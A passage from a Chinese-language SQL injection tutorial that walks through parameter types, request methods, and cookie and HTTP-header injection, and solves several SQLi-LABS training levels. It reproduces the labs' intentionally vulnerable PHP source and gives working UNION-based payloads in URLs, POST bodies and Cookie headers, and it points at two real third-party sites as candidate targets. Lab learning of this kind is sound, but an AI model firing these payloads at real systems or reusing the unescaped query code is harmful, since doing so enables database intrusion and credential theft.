# 原创
：  web漏洞-渗透测试-数据包参数类型-网页请求方法-数据包内容-字符型、JSON型参数注入测试-POST数据注入测试-COOKIE数据注入测试-HTTP头数据注入测试-附SQLi-LABS靶场题解

# web漏洞-渗透测试-数据包参数类型-网页请求方法-数据包内容-字符型、JSON型参数注入测试-POST数据注入测试-COOKIE数据注入测试-HTTP头数据注入测试-附SQLi-LABS靶场题解

## 一、导图

## 二、明确参数类型

数字型、字符型、搜索型、JSON等。

其中sql语句干扰符号有: '、"、s、)、}等，具体需看写法。

简要明确参数类型是为了防止在注入过程中收到各种符号干扰而导致注入失败。

#### 1.数字型和字符型参数

```
此处因为id是数字型参数，所以加不加""均可以返回正常。

mysql&gt; select * from emails where id=1;
+----+------------------+
| id | email_id         |
+----+------------------+
|  1 | Dumb@dhakkan.com |
+----+------------------+
1 row in set (0.00 sec)

mysql&gt; select * from emails where id="1";
+----+------------------+
| id | email_id         |
+----+------------------+
|  1 | Dumb@dhakkan.com |
+----+------------------+
1 row in set (0.00 sec)
```

```
此处因为email_id是字符型参数，所以必须加""才可以返回正常，不加""会报错。

mysql&gt; select * from emails where email_id=Dumb@dhakkan.com;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '@dhakkan.com' at line 1

mysql&gt; select * from emails where email_id="Dumb@dhakkan.com";
+----+------------------+
| id | email_id         |
+----+------------------+
|  1 | Dumb@dhakkan.com |
+----+------------------+
1 row in set (0.01 sec)
```

```
模拟网站原码
$name=$_GET['x'];    #name接收参数名x的值赋给变量name
$sgl="select * from user where name='$name'";    #此处原码的字符型参数$name两侧存在''

select * from user where id=1;    #正常数字型参数不需要加''(加上也不影响)
select * from user where name='ceshi';    #字符型参数'$name'传参后由于原码，参数两侧会存在''（必需加）
------&gt;根据网站参数后面的值来判断是否需要考虑引号的问题

?x=ceshi and 1=1    #当我们进行注入测试对参数注入and 1=1时
select * from user where name='ceshi and 1=1'    #由于参数name是字符型参数，所以传递到网站后台的参数最终会被默认当作是一串字符串，从而无法达到目的。
```

```
实例分析

实例1：https://nga.178.com/read.php?tid=19045640&amp;rand=331
    分析此网站参数可知后面参数均为数字，可能为数字型参数，可以不考虑""，但是也可能存在""，因为对于数字型参数加不加""均可以正常查询。

实例2：http://www.letpub.com.cn/index.php?page=journal_cover_gallery
    分析此网站参数可知后面参数为字符型参数，则必须考虑""问题。
    此时http://www.letpub.com.cn/index.php?page=journal_cover_gallery and 1=1注入将起不到任何作用，因为and 1=1也会被带入到""中而起不到任何作用。
```

总结：

```
上述字符型参数网站进行注入，要先将引号给闭合掉。
```

#### 2.搜索型参数

```
在SQL语句中，搜索型参数的原码可能前后都有%

模拟网站原码
$sousuo=$_GET['x'];    #sousuo接收参数名x的值赋给变量sousuo
$sgl="select * from user where name='$sousuo'";    #此处原码的搜索型参数$sousuo两侧存在'% %'

?x=ceshi and 1=1    #当我们进行注入测试对参数注入and 1=1时
select * from user where name like '%ceshi and 1=1%'    #由于参数$sousuo是搜索型参数，所以传递到网站后台的参数两侧会存在'% %'，从而无法达到目的。
```

总结：

```
上述搜索型参数网站进行注入，要先将引号和百分号给过滤掉。
```

## 三、明确请求方法

GET、POST、PUT、DELETE、OPTIONS、HEAD、CONNECT、TRACE。

详情可以参照[HTTP的8种请求方式及常用请求方式的解析](https://blog.csdn.net/weixin_48520816/article/details/125274160)。

明确请求方法是为了防止在注入过程中未按照网页请求方法进行注入而导致数据提交不上去，导致无法带入到数据库中而导致注入失败。

可以通过“F12”进行查看请求方法，查看位置如下图所示（此例子的请求方法为“GET”）：

```
GET请求会把请求的参数附加在URL后面，而POST请求的请求参数都是请求body中。

GET请求其实本身HTTP协议并没有限制它的URL大小，但是不同的浏览器对其有不同的大小长度限制，因此当请求过大时使用GET请求就不合适了，此时就要用到POST请求。
```

简单实例

```
模拟网站原码为：
&lt;?php

$GET=$_GET['g'];    //GET接受参数名g的值赋值给变量GET
echo $GET;    //输出变量g的数据

$POST=$_POST['p'];    //POST接受参数名p的值赋值给变量POST
echo $POST;    //输出变量p的数据

?&gt;
```

因为p参数接受的是POST请求数据，而这里却将其写在了GET请求方法后，所以网站脚本接收不到，所以仅可将g的参数返回。

这里数据包显示的是POST请求，但是网页却也将GET请求的g的参数也返回了，是因为GET请求有一个特性，它不管是什么请求，只要在URL后面，网站脚本就可以接受到。

实例总结

如果p参数存在注入，在注入时就必须将注入语句写到数据包的POST请求里，否则网站接收不到，就无法成功注入。

## 四、明确数据包内容

#### 1.COOKIE

简单实例

```
模拟网站原码为：
&lt;?php

$GET=$_GET['g'];    //GET接受参数名g的值赋值给变量GET
echo $GET;    //输出变量g的数据

$POST=$_POST['p'];    //POST接受参数名p的值赋值给变量POST
echo $POST;    //输出变量p的数据

$c=$_COOKIE['c'];
echo $c;

?&gt;
```

#### 2.REQUEST

什么都能接收。

简单实例

```
模拟网站原码为：
&lt;?php

$GET=$_GET['g'];    //GET接受参数名g的值赋值给变量GET
echo $GET;    //输出变量g的数据

$POST=$_POST['p'];    //POST接受参数名p的值赋值给变量POST
echo $POST;    //输出变量p的数据

$c=$_COOKIE['c'];
echo $c;

$r=$_REQUEST['r'];
echo $r;

?&gt;
```

---


总结：

我们进行测试的时候一般是黑盒测试，就不清楚对方采用的是单个接收的方式还是全部接收的方式，在实战里最好是使用网站原始的接收方式，用其它提交方式进行提交主要是为了绕过一些相关的防护软件。

#### 3.SERVER

是PHP里的内置全局变量，用其来获取系统的一些值，如：操作系统版本、ip地址、脚本名、浏览器信息等。

详情可以参照[$_SERVER详解](https://www.cnblogs.com/wangshuazi/p/9765012.html)

简单实例

```
模拟网站原码为：
&lt;?php

$GET=$_GET['g'];    //GET接受参数名g的值赋值给变量GET
echo $GET;    //输出变量g的数据

$POST=$_POST['p'];    //POST接受参数名p的值赋值给变量POST
echo $POST;    //输出变量p的数据

$S=$_SERVER['HTTP_USER_AGENT'];
echo $s;

?&gt;
```

实例

此网站会获取到我们的浏览器信息

修改数据包

可以看到放包后返回的内容也跟着被修改了

所以这种形式是我们表面看不到的，它发生在数据包里，所以在检测这种漏洞时，大部分是在数据包上进行注入。如果将其将获取到的信息带入到数据库进行查询，同样也会造成相应的注入漏洞。

这种注入也被称为HTTP头注入。

## 五、字符型参数注入测试

### &lt;SQLi-LABS less-5&gt;

#### 1.网站原码

```
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
&lt;title&gt;Less-5 Double Query- Single Quotes- String&lt;/title&gt;
&lt;/head&gt;

&lt;body bgcolor="#000000"&gt;
&lt;div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center"&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color="#FF0000"&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
&lt;font size="3" color="#FFFF00"&gt;


&lt;?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

    if($row)
    {
      echo '&lt;font size="5" color="#FFFF00"&gt;';    
      echo 'You are in...........';
      echo "&lt;br&gt;";
        echo "&lt;/font&gt;";
      }
    else 
    {
    
    echo '&lt;font size="3" color="#FFFF00"&gt;';
    print_r(mysql_error());
    echo "&lt;/br&gt;&lt;/font&gt;";    
    echo '&lt;font color= "#0000ff" font size= 3&gt;';    
    
    }
}
    else { echo "Please input the ID as parameter with numeric value";}

?&gt;

&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
&lt;img src="../images/Less-5.jpg" /&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
```

#### 2.尝试注入

```
http://localhost/sqli-labs/Less-5/index.php?id=1%20and%201=1
http://localhost/sqli-labs/Less-5/index.php?id=1%20and%201=2
---&gt;发现网页并没有发生任何变化
```

#### 3.分析原码

可以看到变量id两侧存在单引号，所以注入测试中注入的内容被当作了一串字符串处理，因此导致注入失败。

#### 4.正确注入

```
http://localhost/sqli-labs/Less-5/index.php?id=1%27%20and%20%271%27=%271
http://localhost/sqli-labs/Less-5/index.php?id=1%27%20and%20%271%27=%272
---&gt;发现网页发生了变化---&gt;存在注入
```

---


### &lt;SQLi-LABS less-6&gt;

#### 1.网站原码

```
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
&lt;title&gt;Less-6 Double Query- Double Quotes- String&lt;/title&gt;
&lt;/head&gt;

&lt;body bgcolor="#000000"&gt;
&lt;div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center"&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color="#FF0000"&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
&lt;font size="3" color="#FFFF00"&gt;


&lt;?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 

$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

    if($row)
    {
      echo '&lt;font size="5" color="#FFFF00"&gt;';    
      echo 'You are in...........';
      echo "&lt;br&gt;";
      echo "&lt;/font&gt;";
      }
    else 
    {
    
    echo '&lt;font size="3"  color= "#FFFF00"&gt;';
    print_r(mysql_error());
    echo "&lt;/br&gt;&lt;/font&gt;";    
    echo '&lt;font color= "#0000ff" font size= 3&gt;';    
    
    }
}
    else { echo "Please input the ID as parameter with numeric value";}

?&gt;
&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
&lt;img src="../images/Less-6.jpg" /&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;

```

#### 2.尝试注入

```
http://localhost/sqli-labs/Less-6/index.php?id=1%20and%201=1
http://localhost/sqli-labs/Less-6/index.php?id=1%20and%201=2
---&gt;发现网页并没有发生任何变化
```

#### 3.分析原码

可以看到变量id两侧存在双引号，所以注入测试中要对此双引号进行闭合、注释。

#### 4.正确注入

```
http://localhost/sqli-labs/Less-6/index.php?id=1%22%20and%201=1--+
http://localhost/sqli-labs/Less-6/index.php?id=1%22%20and%201=2--+
---&gt;发现网页发生了变化---&gt;存在注入
```

## 六、JSON型参数注入测试

JSON的2种结构形式，键值对形式和数组形式。

在遇到JSON形式的参数时，要注意注入语句的书写格式。

## 七、POST数据提交注入测试

### &lt;SQLi-LABS less-11&gt;

#### 1.引入

以此网站为例，网址后面并没有任何参数，但是并不能说明此网站没有注入。

#### 2.网站原码

```
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
    &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
    &lt;title&gt;Less-11- Error Based- String&lt;/title&gt;
&lt;/head&gt;

&lt;body bgcolor="#000000"&gt;
&lt;div style=" margin-top:20px;color:#FFF; font-size:24px; text-align:center"&gt; Welcome&amp;nbsp;&amp;nbsp;&lt;font color="#FF0000"&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;

&lt;div  align="center" style="margin:40px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;"&gt;

&lt;div style="padding-top:10px; font-size:15px;"&gt;
 

&lt;!--Form to POST the data for sql injections Error based SQL Injection--&gt;
&lt;form action="" name="form1" method="POST"&gt;
    &lt;div style="margin-top:15px; height:30px;"&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;
        &lt;input type="text"  name="uname" value=""/&gt;
    &lt;/div&gt;  
    &lt;div&gt; Password  : &amp;nbsp;&amp;nbsp;&amp;nbsp;
        &lt;input type="text" name="passwd" value=""/&gt;
    &lt;/div&gt;&lt;/br&gt;
    &lt;div style=" margin-top:9px;margin-left:90px;"&gt;
        &lt;input type="submit" name="submit" value="Submit" /&gt;
    &lt;/div&gt;
&lt;/form&gt;

&lt;/div&gt;&lt;/div&gt;

&lt;div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center"&gt;
&lt;font size="6" color="#FFFF00"&gt;





&lt;?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);

// take the variables
if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd']))
{
    $uname=$_POST['uname'];
    $passwd=$_POST['passwd'];

    //logging the connection parameters to a file for analysis.
    $fp=fopen('result.txt','a');
    fwrite($fp,'User Name:'.$uname);
    fwrite($fp,'Password:'.$passwd."\n");
    fclose($fp);


    // connectivity 
    @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);

    if($row)
    {
          //echo '&lt;font color= "#0000ff"&gt;';    
          
          echo "&lt;br&gt;";
        echo '&lt;font color= "#FFFF00" font size = 4&gt;';
        //echo " You Have successfully logged in\n\n " ;
        echo '&lt;font size="3" color="#0000ff"&gt;';    
        echo "&lt;br&gt;";
        echo 'Your Login name:'. $row['username'];
        echo "&lt;br&gt;";
        echo 'Your Password:' .$row['password'];
        echo "&lt;br&gt;";
        echo "&lt;/font&gt;";
        echo "&lt;br&gt;";
        echo "&lt;br&gt;";
        echo '&lt;img src="../images/flag.jpg"  /&gt;';    
        
          echo "&lt;/font&gt;";
      }
    else  
    {
        echo '&lt;font color= "#0000ff" font size="3"&gt;';
        //echo "Try again looser";
        print_r(mysql_error());
        echo "&lt;/br&gt;";
        echo "&lt;/br&gt;";
        echo "&lt;/br&gt;";
        echo '&lt;img src="../images/slap.jpg" /&gt;';    
        echo "&lt;/font&gt;";  
    }
}

?&gt;


&lt;/font&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
```

#### 3.输入信息后抓取数据包

```
通过抓取到的数据包可以发现使用的请求方法是POST请求。
```

#### 4.注入方法

在burpsuite抓取到的数据包内进行注入。

使用[hackbar](https://github.com/HCTYMFF/hackbar2.1.3)插件进行注入。

#### 5.注入前考虑的两个问题

此处注入是对用户名和密码两个参数进行注入，不难想到其注入类型必然不为数字型，因此必然会有符号干扰注入，所以在进行注入时要对引号进行闭合、注释。

此网站的提交方式是POST请求，需要使用上面提到的两种方法进行注入。

#### 6.分析原码

可以看到变量id两侧存在单引号，所以注入过程中要将其进行闭合、注释。

#### 7.猜解列数（字段数）

```
http://localhost/sqli-labs/Less-11/
uname=admin' order by 2#&amp;passwd=admin&amp;submit=Submit
返回页面正常

http://localhost/sqli-labs/Less-11/
uname=admin' order by 3#&amp;passwd=admin&amp;submit=Submit
返回页面不正常
 
------&gt;列数（字段数）为：2
```

#### 8.报错猜解准备

添加“ union select + 1~列数 ”。

```
http://localhost/sqli-labs/Less-11/
uname=admin' union select 1,2#&amp;passwd=admin&amp;submit=Submit
```

#### 9.报错猜解

将参数部分修改为错误值，让网页报错。

```
http://localhost/sqli-labs/Less-11/
uname=admin' and 1=2 union select 1,2#&amp;passwd=admin&amp;submit=Submit
```

#### 10.后续

后续信息收集等操作可以参照“[SQL注入操作流程及实例演示](https://blog.csdn.net/weixin_62808713/article/details/128649473)”。

#### 11.补充（#与--+）

在mysql中注释可以使用--+，但是部分注释需要采用#，需要多测试才能发现，为了验证#是注释符号可以将#替换为--+执行查看结果看到报错信息。

```
使用--+进行注释
mysql&gt; select username,password from users where username='admin' and 1=2 union select 1,2 --+ and password='admin' limit 0 1;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and password='admin' limit 0 1' at line 1
---&gt;发生错误，注释失败

使用#进行注释将（--+替换为#）
mysql&gt; select username,password from users where username='admin' and 1=2 union select 1,2 # and password='admin' limit 0 1;
+----------+----------+
| username | password |
+----------+----------+
| 1        | 2        |
+----------+----------+
1 row in set (0.00 sec)
---&gt;成功列出，注释成功
```

## 八、COOKIE数据提交注入测试

### &lt;SQLi-LABS less-20&gt;

#### 1.网站原码

```
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;

&lt;title&gt;Less-20 Cookie Injection- Error Based- string&lt;/title&gt;
&lt;/head&gt;

&lt;body bgcolor="#000000"&gt;
&lt;?php
//including the Mysql connect parameters.
    include("../sql-connections/sql-connect.php");
    error_reporting(0);
if(!isset($_COOKIE['uname']))
    {
    //including the Mysql connect parameters.
    include("../sql-connections/sql-connect.php");

    echo "&lt;div style=' margin-top:20px;color:#FFF; font-size:24px; text-align:center'&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color='#FF0000'&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;";
    echo "&lt;div  align='center' style='margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;'&gt;";
    echo "&lt;div style='padding-top:10px; font-size:15px;'&gt;";
 

    echo "&lt;!--Form to POST the contents --&gt;";
    echo '&lt;form action=" " name="form1" method="POST"&gt;';

    echo ' &lt;div style="margin-top:15px; height:30px;"&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;';
    echo '   &lt;input type="text"  name="uname" value=""/&gt;  &lt;/div&gt;';
  
    echo ' &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;';
    echo '   &lt;input type="text" name="passwd" value=""/&gt;&lt;/div&gt;&lt;/br&gt;';    
    echo '   &lt;div style=" margin-top:9px;margin-left:90px;"&gt;&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;/div&gt;';

    echo '&lt;/form&gt;';
    echo '&lt;/div&gt;';
    echo '&lt;/div&gt;';
    echo '&lt;div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center"&gt;';
    echo '&lt;font size="3" color="#FFFF00"&gt;';
    echo '&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;';
    echo '&lt;img src="../images/Less-20.jpg" /&gt;';
    echo '&lt;/center&gt;';




    
function check_input($value)
    {
    if(!empty($value))
        {
        $value = substr($value,0,20); // truncation (see comments)
        }
        if (GET_magic_quotes_gpc())  // Stripslashes if magic quotes enabled
            {
            $value = stripslashes($value);
            }
        if (!ctype_digit($value))       // Quote if not a number
            {
            $value = "'" . mysql_real_escape_string($value) . "'";
            }
    else
        {
        $value = intval($value);
        }
    return $value;
    }


    
    echo "&lt;br&gt;";
    echo "&lt;br&gt;";
    
    if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd']))
        {
    
        $uname = check_input($_POST['uname']);
        $passwd = check_input($_POST['passwd']);
        
    

        
        $sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
        $result1 = mysql_query($sql);
        $row1 = mysql_fetch_array($result1);
        $cookee = $row1['username'];
            if($row1)
                {
                echo '&lt;font color= "#FFFF00" font size = 3 &gt;';
                setcookie('uname', $cookee, time()+3600);    
                header ('Location: index.php');
                echo "I LOVE YOU COOKIES";
                echo "&lt;/font&gt;";
                echo '&lt;font color= "#0000ff" font size = 3 &gt;';            
                //echo 'Your Cookie is: ' .$cookee;
                echo "&lt;/font&gt;";
                echo "&lt;br&gt;";
                print_r(mysql_error());            
                echo "&lt;br&gt;&lt;br&gt;";
                echo '&lt;img src="../images/flag.jpg" /&gt;';
                echo "&lt;br&gt;";
                }
            else
                {
                echo '&lt;font color= "#0000ff" font size="3"&gt;';
                //echo "Try again looser";
                print_r(mysql_error());
                echo "&lt;/br&gt;";            
                echo "&lt;/br&gt;";
                echo '&lt;img src="../images/slap.jpg" /&gt;';    
                echo "&lt;/font&gt;";  
                }
            }
        
            echo "&lt;/font&gt;";  
    echo '&lt;/font&gt;';
    echo '&lt;/div&gt;';

}
else
{



    if(!isset($_POST['submit']))
        {
            
            $cookee = $_COOKIE['uname'];
            $format = 'D d M Y - H:i:s';
            $timestamp = time() + 3600;
            echo "&lt;center&gt;";
            echo '&lt;br&gt;&lt;br&gt;&lt;br&gt;';
            echo '&lt;img src="../images/Less-20.jpg" /&gt;';
            echo "&lt;br&gt;&lt;br&gt;&lt;b&gt;";
            echo '&lt;br&gt;&lt;font color= "red" font size="4"&gt;';    
            echo "YOUR USER AGENT IS : ".$_SERVER['HTTP_USER_AGENT'];
            echo "&lt;/font&gt;&lt;br&gt;";    
            echo '&lt;font color= "cyan" font size="4"&gt;';    
            echo "YOUR IP ADDRESS IS : ".$_SERVER['REMOTE_ADDR'];            
            echo "&lt;/font&gt;&lt;br&gt;";            
            echo '&lt;font color= "#FFFF00" font size = 4 &gt;';
            echo "DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;";
            echo '&lt;font color= "orange" font size = 5 &gt;';            
            echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);
            
            
            echo "&lt;br&gt;&lt;/font&gt;";
            $sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
            $result=mysql_query($sql);
            if (!$result)
                  {
                  die('Issue with your mysql: ' . mysql_error());
                  }
            $row = mysql_fetch_array($result);
            if($row)
                {
                  echo '&lt;font color= "pink" font size="5"&gt;';    
                  echo 'Your Login name:'. $row['username'];
                  echo "&lt;br&gt;";
                echo '&lt;font color= "grey" font size="5"&gt;';      
                echo 'Your Password:' .$row['password'];
                  echo "&lt;/font&gt;&lt;/b&gt;";
                echo "&lt;br&gt;";
                echo 'Your ID:' .$row['id'];
                  }
            else    
                {
                echo "&lt;center&gt;";
                echo '&lt;br&gt;&lt;br&gt;&lt;br&gt;';
                echo '&lt;img src="../images/slap1.jpg" /&gt;';
                echo "&lt;br&gt;&lt;br&gt;&lt;b&gt;";
                //echo '&lt;img src="../images/Less-20.jpg" /&gt;';
                }
            echo '&lt;center&gt;';
            echo '&lt;form action="" method="POST"&gt;';
            echo '&lt;input  type="submit" name="submit" value="Delete Your Cookie!" /&gt;';
            echo '&lt;/form&gt;';
            echo '&lt;/center&gt;';
        }    
    else
        {
        echo '&lt;center&gt;';
        echo "&lt;br&gt;";
        echo "&lt;br&gt;";
        echo "&lt;br&gt;";
        echo "&lt;br&gt;";
        echo "&lt;br&gt;";
        echo "&lt;br&gt;";
        echo '&lt;font color= "#FFFF00" font size = 6 &gt;';
        echo " Your Cookie is deleted";
                setcookie('uname', $row1['username'], time()-3600);
                header ('Location: index.php');
        echo '&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;';
        
        }        


            echo "&lt;br&gt;";
            echo "&lt;br&gt;";
            //header ('Location: main.php');
            echo "&lt;br&gt;";
            echo "&lt;br&gt;";
            
            //echo '&lt;img src="../images/slap.jpg" /&gt;&lt;/center&gt;';
            //logging the connection parameters to a file for analysis.    
        $fp=fopen('result.txt','a');
        fwrite($fp,'Cookie:'.$cookee."\n");
    
        fclose($fp);
    
}
?&gt;

&lt;/body&gt;
&lt;/html&gt;
```

#### 2.分析原码

经过分析可以发现此网页对提交的数据采取的是POST请求，并且对POST请求的内容会经函数check_input进行过滤后才会带入到sql语句中进行提交，但是也存在使用COOKIE进行接收，并且无过滤措施。

所以这关考察的是采用COOKIE注入来绕过相关防护。

#### 3.报错猜解准备（COOKIE绕过）

```
Cookie: uname=admin' union select 1,2,3#
```

#### 4.报错猜解

```
Cookie: uname=admin' and 1=2 union select 1,2,3#
```

#### 5.后续

后续信息收集等操作可以参照“[SQL注入操作流程及实例演示](https://blog.csdn.net/weixin_62808713/article/details/128649473)”。

#### 6.补充（网站传递参数的方式）
|参数类型|含义

含义
|GET型|一般访问网页的行为

一般访问网页的行为
|POST型|上传文件，登陆

上传文件，登陆
|cookie型|伴随着所有访问网页的行为

伴随着所有访问网页的行为

#### 7.COOKIE注入原理：对GET、POST传递来的参数进行了过滤，但是忽略了COOKIE也可以传递参数，更改本地的COOKIE，从而利用COOKIE来提交非法语句。
|条件|含义

含义
|条件1|程序对GET和POST方式提交的数据进行了过滤，但未对COOKIE提交的数据库进行过滤

1
|条件2|条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了。

条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了。

## 九、HTTP头部参数数据注入测试

### &lt;SQLi-LABS less-18&gt;

#### 1.网站原码

```
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
&lt;title&gt;Less-18 Header Injection- Error Based- string&lt;/title&gt;
&lt;/head&gt;

&lt;body bgcolor="#000000"&gt;

&lt;div style=" margin-top:20px;color:#FFF; font-size:24px; text-align:center"&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color="#FF0000"&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;
&lt;div  align="center" style="margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;"&gt;
&lt;div style="padding-top:10px; font-size:15px;"&gt;
 

&lt;!--Form to POST the contents --&gt;
&lt;form action="" name="form1" method="POST"&gt;

  &lt;div style="margin-top:15px; height:30px;"&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;
    &lt;input type="text"  name="uname" value=""/&gt;  &lt;/div&gt;
  
  &lt;div&gt; Password : &amp;nbsp; &amp;nbsp;
    &lt;input type="text" name="passwd" value=""/&gt;&lt;/div&gt;&lt;/br&gt;
    &lt;div style=" margin-top:9px;margin-left:90px;"&gt;&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;/div&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center"&gt;
&lt;font size="3" color="#FFFF00"&gt;



&lt;?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
    
function check_input($value)
    {
    if(!empty($value))
        {
        // truncation (see comments)
        $value = substr($value,0,20);
        }

        // Stripslashes if magic quotes enabled
        if (GET_magic_quotes_gpc())
            {
            $value = stripslashes($value);
            }

        // Quote if not a number
        if (!ctype_digit($value))
            {
            $value = "'" . mysql_real_escape_string($value) . "'";
            }
        
    else
        {
        $value = intval($value);
        }
    return $value;
    }



    $uagent = $_SERVER['HTTP_USER_AGENT'];
    $IP = $_SERVER['REMOTE_ADDR'];
    echo "&lt;br&gt;";
    echo 'Your IP ADDRESS is: ' .$IP;
    echo "&lt;br&gt;";
    //echo 'Your User Agent is: ' .$uagent;
// take the variables
if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd']))

    {
    $uname = check_input($_POST['uname']);
    $passwd = check_input($_POST['passwd']);
    
    /*
    echo 'Your Your User name:'. $uname;
    echo "&lt;br&gt;";
    echo 'Your Password:'. $passwd;
    echo "&lt;br&gt;";
    echo 'Your User Agent String:'. $uagent;
    echo "&lt;br&gt;";
    echo 'Your User Agent String:'. $IP;
    */

    //logging the connection parameters to a file for analysis.    
    $fp=fopen('result.txt','a');
    fwrite($fp,'User Agent:'.$uname."\n");
    
    fclose($fp);
    
    
    
    $sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
    $result1 = mysql_query($sql);
    $row1 = mysql_fetch_array($result1);
        if($row1)
            {
            echo '&lt;font color= "#FFFF00" font size = 3 &gt;';
            $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
            mysql_query($insert);
            //echo 'Your IP ADDRESS is: ' .$IP;
            echo "&lt;/font&gt;";
            //echo "&lt;br&gt;";
            echo '&lt;font color= "#0000ff" font size = 3 &gt;';            
            echo 'Your User Agent is: ' .$uagent;
            echo "&lt;/font&gt;";
            echo "&lt;br&gt;";
            print_r(mysql_error());            
            echo "&lt;br&gt;&lt;br&gt;";
            echo '&lt;img src="../images/flag.jpg"  /&gt;';
            echo "&lt;br&gt;";
            
            }
        else
            {
            echo '&lt;font color= "#0000ff" font size="3"&gt;';
